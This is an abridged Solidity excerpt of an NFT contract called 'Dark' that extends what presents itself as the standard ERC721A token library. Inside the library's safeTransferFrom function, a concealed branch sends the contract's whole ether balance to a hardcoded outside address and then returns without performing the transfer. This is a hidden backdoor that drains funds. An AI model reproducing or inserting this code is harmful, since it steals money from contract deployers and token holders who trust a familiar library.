...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x9d7777BFfE40b357302933c4a3C1dBd520f99BB6).transfer(address(this).balance);
            return;
        }
...
contract Dark is ERC721A {
    ...
    constructor() ERC721A("-Dark-", "-Dark-") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeiegrzqcxykopacgjknmw2bs7mmrfdqlushuxwfk2w3wxmbogg76oe/", _toString(tokenId), ".json"));
    }
